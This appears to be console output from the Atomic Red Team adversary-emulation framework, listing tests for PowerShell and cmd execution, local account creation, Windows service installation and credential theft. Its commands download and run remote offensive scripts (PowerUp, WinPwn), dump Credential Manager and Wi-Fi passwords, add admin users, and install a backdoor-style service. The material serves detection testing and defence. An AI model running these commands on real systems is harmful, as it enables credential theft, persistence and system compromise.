if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
Get Prereq Command:
Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: PowerShell Command Execution
Atomic Test Number: 19
Atomic Test GUID: a538de64-1c74-46ed-aa60-b995ed302598
Description: Use of obfuscated PowerShell to execute an arbitrary command; outputs "Hello, from PowerShell!". Example is from the 2021 Threat Detection Report by Red Canary.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
powershell.exe -e  #{obfuscated_code}
Command (with inputs):
powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIAB
mAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: PowerShell Invoke Known Malicious Cmdlets
Atomic Test Number: 20
Atomic Test GUID: 49eb9404-5e0f-4031-a179-b40f7be385e3
Description: Powershell execution of known Malicious PowerShell Cmdlets

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$malcmdlets = #{Malicious_cmdlets}
foreach ($cmdlets in $malcmdlets) {
    "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}
Command (with inputs):
$malcmdlets = "Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword", "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot", "Get-Va
ultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection", "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan", "Invoke-Reflecti
vePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode", "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy", "New-ElevatedPersistenceOption", "New-UserPe
rsistenceOption", "New-VolumeShadowCopy", "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump", "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeS
hadowCopy", "Set-CriticalProcess", "Set-MasterBootRecord"

foreach ($cmdlets in $malcmdlets) {
    "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: PowerUp Invoke-AllChecks
Atomic Test Number: 21
Atomic Test GUID: 1289f78d-22d2-4590-ac76-166737e1811b
Description: Check for privilege escalation paths using PowerUp from PowerShellMafia

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: PowerShell T1059.001
Atomic Test Name: Abuse Nslookup with DNS Records
Atomic Test Number: 22
Atomic Test GUID: 999bff6d-dc15-44c9-9f5c-e1051bfc86e1
Description: Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts. [reference](https://twitter.com
/jstrosch/status/1237382986557001729)

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
# creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Create and Execute Batch Script
Atomic Test Number: 1
Atomic Test GUID: 9e8894c0-50bd-4525-a96c-d4ac78ece388
Description: Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Start-Process "#{script_path}"
Command (with inputs):
Start-Process "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059.003_script.bat"

Cleanup Commands:
Command:
Remove-Item "#{script_path}" -Force -ErrorAction Ignore
Command (with inputs):
Remove-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059.003_script.bat" -Force -ErrorAction Ignore

Dependencies:
Description: Batch file must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059.003_script.bat)
Check Prereq Command:
if (Test-Path "#{script_path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059.003_script.bat") {exit 0} else {exit 1}
Get Prereq Command:
New-Item "#{script_path}" -Force | Out-Null
Set-Content -Path "#{script_path}" -Value "#{command_to_execute}"
Get Prereq Command (with inputs):
New-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059.003_script.bat" -Force | Out-Null
Set-Content -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059.003_script.bat" -Value "dir"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Writes text to a file and displays it.
Atomic Test Number: 2
Atomic Test GUID: 127b4afe-2346-4192-815c-69042bec570e
Description: Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"
Command (with inputs):
echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"

Cleanup Commands:
Command:
del "#{file_contents_path}" >nul 2>&1
Command (with inputs):
del "%TEMP%\test.bin" >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Suspicious Execution via Windows Command Shell
Atomic Test Number: 3
Atomic Test GUID: d0eb3597-a1b3-4d65-b33b-2cda8d397f20
Description: Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}
Command (with inputs):
%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Simulate BlackByte Ransomware Print Bombing
Atomic Test Number: 4
Atomic Test GUID: 6b2903ac-8f36-450d-9ad5-b220e8a2dcb9
Description: This test attempts to open a file a specified number of times in Wordpad, then prints the contents.  It is designed to mimic BlackByte ransomware's print bombing techniq
ue, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed.  See https://redcanary.com/blog/blackbyte-ransomware/.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
cmd /c "for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}" | out-null
Command (with inputs):
cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059_003note.txt" | out-null

Cleanup Commands:
Command:
stop-process -name wordpad -force -erroraction silentlycontinue

Dependencies:
Description: File to print must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059_003note.txt)
Check Prereq Command:
if (test-path "#{file_to_print}"){exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (test-path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059_003note.txt"){exit 0} else {exit 1}
Get Prereq Command:
new-item "#{file_to_print}" -value "This file has been created by T1059.003 Test 4" -Force | Out-Null
Get Prereq Command (with inputs):
new-item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1059_003note.txt" -value "This file has been created by T1059.003 Test 4" -Force | Out-Null
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Command Prompt read contents from CMD file and execute
Atomic Test Number: 5
Atomic Test GUID: df81db1b-066c-4802-9bc8-b6d030c3ba8e
Description: Simulate Raspberry Robin using the "standard-in" command prompt feature cmd `/R <` to read and execute a file via cmd.exe See https://redcanary.com/blog/raspberry-robin/
.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
cmd /r cmd<"#{input_file}"
Command (with inputs):
cmd /r cmd<"C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd"

Dependencies:
Description: CMD file must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd)
Check Prereq Command:
if (Test-Path "#{input_file}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{input_file}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "#{input_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.c
md"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Command prompt writing script to file then executes it
Atomic Test Number: 6
Atomic Test GUID: 00682c9f-7df4-4df8-950b-6dcaaa3ad9af
Description: Simulate DarkGate malware's second stage by writing a VBscript to disk directly from the command prompt then executing it.     The script will execute 'whoami' then exit
.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
c:\windows\system32\cmd.exe /c cd /d #{script_path} & echo Set objShell = CreateObject("WScript.Shell"):Set objExec = objShell.Exec("whoami"):Set objExec = Nothing:Set objShell = Nothing > #{script_name}.vbs & #{script_name}.vbs
Command (with inputs):
c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject("WScript.Shell"):Set objExec = objShell.Exec("whoami"):Set objExec = Nothing:Set objShell = Nothing > 
AtomicTest.vbs & AtomicTest.vbs

Cleanup Commands:
Command:
del "#{script_name}.vbs" >nul 2>&1
Command (with inputs):
del "AtomicTest.vbs" >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1136\T1136.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Create Account: Local Account T1136.001
Atomic Test Name: Create a new user in a command prompt
Atomic Test Number: 3
Atomic Test GUID: 6657864e-0323-4206-9344-ac9cd7265a4f
Description: Creates a new user in a command prompt. Upon execution, "The command completed successfully." will be displayed. To verify the new account, run "net user" in powershell 
or CMD and observe that there is a new user named "T1136.001_CMD"

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
net user /add "#{username}" "#{password}"
Command (with inputs):
net user /add "T1136.001_CMD" "T1136.001_CMD!"

Cleanup Commands:
Command:
net user /del "#{username}" >nul 2>&1
Command (with inputs):
net user /del "T1136.001_CMD" >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Create Account: Local Account T1136.001
Atomic Test Name: Create a new user in PowerShell
Atomic Test Number: 4
Atomic Test GUID: bc8be0ac-475c-4fbf-9b1d-9fffd77afbde
Description: Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the new account, run "net user" in
 powershell or CMD and observe that there is a new user named "T1136.001_PowerShell"

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
New-LocalUser -Name "#{username}" -NoPassword
Command (with inputs):
New-LocalUser -Name "T1136.001_PowerShell" -NoPassword

Cleanup Commands:
Command:
Remove-LocalUser -Name "#{username}" -ErrorAction Ignore
Command (with inputs):
Remove-LocalUser -Name "T1136.001_PowerShell" -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Create Account: Local Account T1136.001
Atomic Test Name: Create a new Windows admin user
Atomic Test Number: 6
Atomic Test GUID: fda74566-a604-4581-a4cc-fbbe21d66559
Description: Creates a new admin user in a command prompt.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
net user /add "#{username}" "#{password}"
net localgroup administrators "#{username}" /add
Command (with inputs):
net user /add "T1136.001_Admin" "T1136_pass"
net localgroup administrators "T1136.001_Admin" /add

Cleanup Commands:
Command:
net user /del "#{username}" >nul 2>&1
Command (with inputs):
net user /del "T1136.001_Admin" >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1543\T1543.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Create or Modify System Process: Windows Service T1543.003
Atomic Test Name: Modify Fax service to run PowerShell
Atomic Test Number: 1
Atomic Test GUID: ed366cde-7d12-49df-a833-671904770b9f
Description: This test will temporarily modify the service Fax by changing the binPath to PowerShell and will then revert the binPath change, restoring Fax to its original state. Upo
n successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\""
sc start Fax

Cleanup Commands:
Command:
sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe" >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Create or Modify System Process: Windows Service T1543.003
Atomic Test Name: Service Installation CMD
Atomic Test Number: 2
Atomic Test GUID: 981e2942-e433-44e9-afc1-8c957a1496b6
Description: Download an executable from github and start it as a service. Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.
exe which will create and start the service. Results will output via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
sc.exe create #{service_name} binPath= "#{binary_path}" start=#{startup_type}  type=#{service_type}
sc.exe start #{service_name}
Command (with inputs):
sc.exe create AtomicTestService_CMD binPath= "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe" start=auto  type=Own
sc.exe start AtomicTestService_CMD

Cleanup Commands:
Command:
sc.exe stop #{service_name} >nul 2>&1
sc.exe delete #{service_name} >nul 2>&1
Command (with inputs):
sc.exe stop AtomicTestService_CMD >nul 2>&1
sc.exe delete AtomicTestService_CMD >nul 2>&1

Dependencies:
Description: Service binary must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe)
Check Prereq Command:
if (Test-Path "#{binary_path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.e
xe"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Create or Modify System Process: Windows Service T1543.003
Atomic Test Name: Service Installation PowerShell
Atomic Test Number: 3
Atomic Test GUID: 491a4af6-a521-4b74-b23b-f7b3f1ee9e77
Description: Installs A Local Service via PowerShell. Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and 
`Start-Service` to start service. Results will be displayed.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
Start-Service -Name "#{service_name}"
Command (with inputs):
New-Service -Name "AtomicTestService_PowerShell" -BinaryPathName "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe"
Start-Service -Name "AtomicTestService_PowerShell"

Cleanup Commands:
Command:
Stop-Service -Name "#{service_name}" 2>&1 | Out-Null
try {(Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()}
catch {}
Command (with inputs):
Stop-Service -Name "AtomicTestService_PowerShell" 2>&1 | Out-Null
try {(Get-WmiObject Win32_Service -filter "name='AtomicTestService_PowerShell'").Delete()}
catch {}

Dependencies:
Description: Service binary must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe)
Check Prereq Command:
if (Test-Path "#{binary_path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.e
xe"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Create or Modify System Process: Windows Service T1543.003
Atomic Test Name: TinyTurla backdoor service w64time
Atomic Test Number: 4
Atomic Test GUID: ef0581fd-528e-4662-87bc-4c2affb86940
Description: It's running Dll as service to emulate the TinyTurla backdoor
[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
copy "#{dllfilename}" %systemroot%\system32\
sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
sc config W64Time DisplayName= "Windows 64 Time"
sc description W64Time "Maintain date and time synch on all clients and services in the network"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
sc start W64Time
Command (with inputs):
copy "C:\AtomicRedTeam\atomics\T1543.003\bin\w64time.dll" %systemroot%\system32\
sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
sc config W64Time DisplayName= "Windows 64 Time"
sc description W64Time "Maintain date and time synch on all clients and services in the network"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
sc start W64Time

Cleanup Commands:
Command:
sc stop W64Time
sc.exe delete W64Time
del %systemroot%\system32\w64time.dll
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /f
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Create or Modify System Process: Windows Service T1543.003
Atomic Test Name: Remote Service Installation CMD
Atomic Test Number: 5
Atomic Test GUID: fb4151a2-db33-4f8c-b7f8-78ea8790f961
Description: Download an executable from github and start it as a service on a remote endpoint Upon successful execution, powershell will download `AtomicService.exe` from github. cm
d.exe will spawn sc.exe which will create and start the service. Results will output via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
sc.exe \\#{remote_host} create #{service_name} binPath= "#{binary_path}" start=#{startup_type} type=#{service_type}
sc.exe \\#{remote_host} start #{service_name}
Command (with inputs):
sc.exe \\localhost create AtomicTestService_CMD binPath= "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe" start=auto type=Own
sc.exe \\localhost start AtomicTestService_CMD

Cleanup Commands:
Command:
sc.exe \\#{remote_host} stop #{service_name} >nul 2>&1
sc.exe \\#{remote_host} delete #{service_name} >nul 2>&1
Command (with inputs):
sc.exe \\localhost stop AtomicTestService_CMD >nul 2>&1
sc.exe \\localhost delete AtomicTestService_CMD >nul 2>&1

Dependencies:
Description: Service binary must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe)
Check Prereq Command:
if (Test-Path "#{binary_path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.e
xe"
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Credentials from Password Stores T1555
Atomic Test Name: Extract Windows Credential Manager via VBA
Atomic Test Number: 1
Atomic Test GUID: 234f9b7c-b53d-4f32-897b-b880a6c9ea7b
Description: This module will extract the credentials found within the Windows credential manager and dump them to $env:TEMP\windows-credentials.txt

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "C:\AtomicRedTeam\atomics\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"

Cleanup Commands:
Command:
Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  New-Object -COMObject "word.Application" | Out-Null
  $process = "winword"
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Get Prereq Command:
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores T1555
Atomic Test Name: Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]
Atomic Test Number: 2
Atomic Test GUID: c89becbe-1758-4e7d-a0f4-97d2188a23e3
Description: This module will extract the credentials from Windows Credential Manager

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCred
entials -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores T1555
Atomic Test Name: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]
Atomic Test Number: 3
Atomic Test GUID: 8fd5a296-6772-4766-9991-ff4e92af7240
Description: This module will extract the credentials from Windows Credential Manager

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -For
ce
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores T1555
Atomic Test Name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]
Atomic Test Number: 4
Atomic Test GUID: 36753ded-e5c4-4eb5-bc3c-e8fba236878d
Description: This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
vaultcmd /listcreds:"Windows Credentials" /all
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores T1555
Atomic Test Name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]
Atomic Test Number: 5
Atomic Test GUID: bc071188-459f-44d5-901a-f8f2625b2d2e
Description: This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
vaultcmd /listcreds:"Web Credentials" /all
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores T1555
Atomic Test Name: WinPwn - Loot local Credentials - lazagne
Atomic Test Number: 6
Atomic Test GUID: 079ee2e9-6f16-47ca-a635-14efcd994118
Description: The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer.  Each software
 stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.).  This tool has been developed for the purpose of finding these passwords for t
he most commonly-used software

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
lazagnemodule -consoleoutput -noninteractive
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores T1555
Atomic Test Name: WinPwn - Loot local Credentials - Wifi Credentials
Atomic Test Number: 7
Atomic Test GUID: afe369c2-b42e-447f-98a3-fb1f4e2b8552
Description: Loot local Credentials - Wifi Credentials technique via function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
wificreds -consoleoutput -noninteractive
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores T1555
Atomic Test Name: WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords
Atomic Test Number: 8
Atomic Test GUID: db965264-3117-4bad-b7b7-2523b7856b92
Description: Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
decryptteamviewer -consoleoutput -noninteractive
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: Run Chrome-password Collector
Atomic Test Number: 1
Atomic Test GUID: 8c05b133-d438-47ca-a630-19cc464c4622
Description: A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.
Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will b
e a file modification of PathToAtomicsFolder\..\ExternalPayloads\sysinternals\passwordsdb.
